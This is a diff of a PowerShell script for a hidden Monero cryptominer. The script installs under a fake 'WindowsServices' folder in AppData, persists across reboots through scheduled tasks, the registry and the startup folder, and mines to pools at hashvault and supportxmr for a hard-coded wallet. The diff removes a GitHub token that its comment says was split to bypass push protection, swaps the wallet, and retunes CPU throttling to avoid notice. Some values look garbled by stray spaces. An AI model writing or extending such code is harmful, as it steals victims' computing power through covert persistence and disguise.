@@ -5,20 +5,14 @@
 #  - Survives reboots (schtasks + registry + startup folder)
 # ============================================================
 
-# ==================== CONFIG ====================
-# Token split to bypass GitHub push protection
-$_t = @("YOUR_TOKEN_HERE", "ZXZc1c2Do", "w34dIuAjT", "GtgBLt2kfsTW")
-$ghToken = $_t -join ""
-$ghOwner = "holyownsurmom    "
-$ghRepo = "miner"
-$ghConfigPath = "config.json"
+
 
 # Fallback values if GitHub is unreachable
-$wallet = "4483G1AgS1pdsLqzt3nFQmL8HPF3C2WVrLMRAdAVGqxz6ipV3aF8no7cmDkH4wMZz9YD5qNUZ96nGLMKpdt5rXZqMwGfLc3"
+$wallet = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
 $pool = "pool.hashvault.pro:443"
 $poolBak = "pool.supportxmr.com:443"
-$idleCpu = 100
-$activeCpu = 60
+$idleCpu = 90
+$activeCpu = 3    0
 $idleThreshold = 75
 
 $installDir = "$env:APPDATA\WindowsServices"
